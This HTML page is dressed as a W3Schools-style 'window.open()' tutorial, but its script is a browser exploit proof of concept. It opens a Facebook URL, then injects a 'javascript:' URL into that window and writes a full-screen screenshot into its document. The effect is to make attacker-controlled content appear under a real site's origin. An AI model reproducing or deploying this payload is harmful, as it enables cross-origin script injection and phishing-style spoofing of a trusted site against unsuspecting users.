<!DOCTYPE html>
<html>
<body>

<h1>The Window Object</h1>
<h2>The open() Method</h2>

<p>Click the button to open a new browser window.</p>

<button onclick="myFunction()">Try it</button>

<script>
function myFunction() {
 var x = window.open("https://www.facebook.com/ajax/bz");

   setTimeout(function(){x.location="javascript:alert()"}, 850)


   setTimeout(function(){x.document.write(`
        <style>
            html, body {
                margin: 0;
                padding: 0;
                height: 100%;
                overflow: hidden; /* Prevent scrolling or overflow */
            }

            img.fullscreen {
                height: 100vh;
                width: 100vw;
                object-fit: cover;
                display: block;
            }
        </style>
        <img class="fullscreen" src="screenshot.jpg" alt="Dog Screenshot">
    `);}, 2400)
}
</script>

</body>
</html>
